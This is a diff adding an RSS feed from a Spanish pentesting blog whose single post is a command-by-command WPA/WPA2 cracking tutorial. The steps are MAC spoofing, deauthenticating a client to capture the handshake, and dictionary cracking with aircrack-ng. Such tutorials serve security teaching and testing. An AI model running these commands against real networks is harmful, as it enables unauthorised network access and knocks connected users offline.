@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>wpa on #&gt; fireroot</title>
+        <link>https://www.procamora.com/tags/wpa/</link>
+        <description>Recent content in wpa on #&gt; fireroot</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>es</language>
+        <lastBuildDate>Sat, 05 Sep 2015 00:00:00 +0000</lastBuildDate><atom:link href="https://www.procamora.com/tags/wpa/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>wpa</title>
+        <link>https://www.procamora.com/p/wpa/</link>
+        <pubDate>Sat, 05 Sep 2015 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.procamora.com/p/wpa/</guid>
+        <description>&lt;img src="https://www.procamora.com/covers/pentesting.png" alt="Featured image of post wpa" /&gt;&lt;h2 id=&#34;wpa--wpa2-cracking&#34;&gt;WPA / WPA2 Cracking&lt;/h2&gt;
+&lt;h6 id=&#34;1-para-saber-que-wlan-tenemos&#34;&gt;1. Para saber que wlan tenemos.&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;airmon-ng&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;2-para-parar-la-wlan0&#34;&gt;2. Para parar la wlan0.&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;airmon-ng stop wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;3-para-bajar-el-adaptador-wifi-y-poder-modificar-su-mac&#34;&gt;3. Para bajar el adaptador wifi y poder modificar su mac&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 down&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;4-para-cambiar-la-mac-podemos-poner-la-que-queramos&#34;&gt;4. Para cambiar la mac, podemos poner la que queramos.&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;macchanger --mac [00:11:22:33:44:55] wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;5-para-volver-a-activar-la-wlan0&#34;&gt;5. Para volver a activar la wlan0.&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;airmon-ng start wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;6-para-escanear-las-redes-cercanas-nos-interesan-las-bssid-y-la-station&#34;&gt;6. Para escanear las redes cercanas. Nos interesan las BSSID y la STATION.&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;airodump-ng mon0&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;7-en---channel-ponemos-el-ch-en---bssid-la-mac-y-en--w-ponemos-la-direccion-de-donde-queremos-que-se-guarden-los-cap&#34;&gt;7. En &amp;ndash;channel ponemos el CH, en &amp;ndash;bssid la MAC y en -w ponemos la direccion de donde queremos que se guarden los .cap.&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;airodump-ng mon0 --channel 11 --bssid [A0:21:B7:D5:A8:78] -w [/tmp/wpa2]&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;8-para-inyectar-paquetes-y-capturar-el-handshake-en--a-ponemos-la-bssid-en--c-ponemos-la-station&#34;&gt;8. Para inyectar paquetes y capturar el Handshake, en -a ponemos la BSSID, en -c ponemos la STATION.&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;aireplay-ng -0 11 -a [A0:21:B7:D5:A8:78] -c [00:12:F0:D3:30:BC] mon0&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Una vez hecho esto solo nos queda desencriptar la password, lo podemos hacer de dos maneras por medio de diccionario o bruteandola con el Jonh The Ripper&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h6 id=&#34;9-crackear-con-diccionario--w-aqui-la-dirección-del-diccionario--b-la-dirección-mac-y-por-ultimo-la-dirección-de-donde-se-guardaban-los-paquetes-cap&#34;&gt;9. Crackear con diccionario, -w aqui la dirección del diccionario -b la dirección MAC, y por ultimo la dirección de donde se guardaban los paquetes .cap&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;aircrack-ng -w [/pentest/passwords/wordlists/darkc0de.lst] -b [A0:21:B7:D5:A8:78] [/tmp/wpa2-01.cap]&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
